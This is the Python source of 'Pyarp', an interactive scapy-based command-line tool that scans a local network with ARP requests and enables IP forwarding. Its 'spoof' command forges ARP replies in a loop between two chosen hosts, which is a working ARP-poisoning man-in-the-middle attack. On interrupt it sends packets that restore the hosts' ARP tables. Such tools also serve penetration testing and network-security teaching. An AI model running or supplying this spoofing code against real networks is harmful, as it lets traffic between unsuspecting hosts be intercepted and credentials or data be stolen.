"""
Copyright (c) 2016 Hsissou Imad
See the file 'LICENSE' for copying permission
"""

from __future__ import print_function
import sys
import os
import time
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from pyarplib import *
from scapy.all import *
import subprocess
import netifaces
import cmd

if os.geteuid()!=0:
	sys.exit("""Permission denied : Pyarp must be run as root.""")

subprocess.call(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
subprocess.call(['clear'])

__global_iface__ ='eth0'

print(pyarp_banner())

def arpreq(inet,iface,option):
	if option == 'clean':
		ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = inet), timeout = 2, iface = iface, verbose=False)
		return ans
	elif option == 'verbose':
		ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = inet), timeout = 2, iface = iface)
		return ans

def getmac(ip):
	if regex(ip,'ip') :
		reply = arpreq(ip,__global_iface__,'clean')
		for snd,rcv in reply:
			return (rcv[Ether].src)
	else:
		return "[!] Please use a valide ip address (IPv6 not supported)."

def connected(host):
	exp = str(getmac(host))
	if regex(exp,'mac') :
		return True
	else:
		return False

def get_urmac():
	AF_LINK = netifaces.ifaddresses(__global_iface__)[netifaces.AF_LINK]
	urmac = str(AF_LINK).split("'addr': '")[1].split("'}")[0]
	return urmac

def forge(psrc,pdst,hwsrc,hwdst):
	arp_packet=ARP()
	arp_packet.op=2
	arp_packet.psrc= psrc
	arp_packet.pdst= pdst
	arp_packet.hwsrc= hwsrc
	arp_packet.hwdst= hwdst
	return arp_packet

def recover(psrc,pdst,hwsrc,hwdst):
	clean_packet = forge(psrc,pdst,hwsrc,hwdst)
	send(clean_packet, verbose=False)

def syntax_err(cmd):
	print("[!] Syntax Error : please type 'help "+cmd+"' or 'man' for details.")


class Pyarp(cmd.Cmd):

	prompt='\033[1;94mpyarp>> \033[1;m'

	__iface__=netifaces.interfaces()
	__AF__=['AF_INET','AF_LINK']

	def do_iface(self,iface):
		"""Usage : iface <interface name>"""

		global __global_iface__
		if iface in self.__iface__:
			__global_iface__ = iface
		elif iface:
			print("[!] Unknown interface.")
		else:
			syntax_err('iface')

	def complete_iface(self,text,line,begidx,endidx):
		if not text:
			completions = self.__iface__[:]
		else:
			completions = [cmd for cmd in self.__iface__ if cmd.startswith(text)]
		return completions

	def do_inet(self,_AF):
		"""Usage : inet [option], see 'man' for options"""

		if _AF=='AF_INET':
			print("\033[1;96m{} : \033[1;m".format(__global_iface__))
			print(netifaces.ifaddresses(__global_iface__)[netifaces.AF_INET])

		elif _AF=='AF_LINK':
			print("\033[1;96m{} : \033[1;m".format(__global_iface__))
			print(netifaces.ifaddresses(__global_iface__)[netifaces.AF_LINK])

		elif _AF:
			syntax_err('inet')

		else:
			print("\033[1;96m{} : \033[1;m".format(__global_iface__))
			print(netifaces.ifaddresses(__global_iface__))

	def complete_inet(self,text,line,begidx,endidx):
		if not text:
			completions = self.__AF__[:]
		else:
			completions = [cmd for cmd in self.__AF__ if cmd.startswith(text)]
		return completions

	def do_getmac(self,ip):
		"""Usage : getmac <host ip address>"""

		if ip:
			print(getmac(ip))
		else:
			syntax_err('getmac')

	def do_scan(self,inet):
		"""Usage : scan <network>, eg {scan 192.168.1.0/24}"""

		if inet and regex(inet,'net'):
			reply = arpreq(inet,__global_iface__,'verbose')
			print ("\ninet {}".format(inet)+"\niface {}\n".format(__global_iface__))
			scn = 1
			for snd,rcv in reply:
				print ("\033[1;92mHost {}\033[1;m: ".format(scn)+(rcv.sprintf(r"MAC %Ether.src%  IP %ARP.psrc%")))
				scn=scn+1
		else:
			syntax_err('scan')
			print("[*] make sure to give a valid network address !")

	def do_spoof(self,line):
		"""Usage : spoof <target> <target> """

		if line and len(line.split()) == 2:
			_host = line.split()

			if regex(_host[0],'ip') and regex(_host[1],'ip') :

				if connected(_host[0]) and connected(_host[1]) :

					urmac = get_urmac()

					hwhost_a = getmac(_host[0])
					hwhost_b = getmac(_host[1])

					arp_packet_a = forge(_host[0],_host[1],urmac,hwhost_b)
					arp_packet_b = forge(_host[1],_host[0],urmac,hwhost_a)

					print("\033[1;92m\n[+] Attack Launched.\n\033[1;m")
					while True:
						try:
					 		send(arp_packet_a)
					 		send(arp_packet_b)
						 	
					 		time.sleep(2)

					 	except KeyboardInterrupt:
							recover(_host[0],_host[1],hwhost_a,"ff:ff:ff:ff:ff:ff")
							recover(_host[1],_host[0],hwhost_b,"ff:ff:ff:ff:ff:ff")
							break

					print("\033[1;92m\n[+] Attack stopped, successful recover.\n\033[1;m")
				else:
					print("[!] Host '"+_host[0]+"' or '"+_host[1]+"' not connected, use 'scan' to scan your network.")
			else:
				print("[!] Please use a valide ip address (IPv6 not supported).")
		else:
			syntax_err('spoof')

	def do_man(self,_):
		print(pyarp_manual())

	def do_license(self,_):
		print(pyarp_license())

	def do_clear(self,_):
		_=subprocess.call(['clear'])

	def emptyline(self):
		'clean line'

	def do_exit(self,line):
		'Close pyarp, press Ctrl+D for quick exit'
		return True

	def do_EOF(self,line):
		print('\n')
		return True

def main():
	Pyarp().cmdloop()
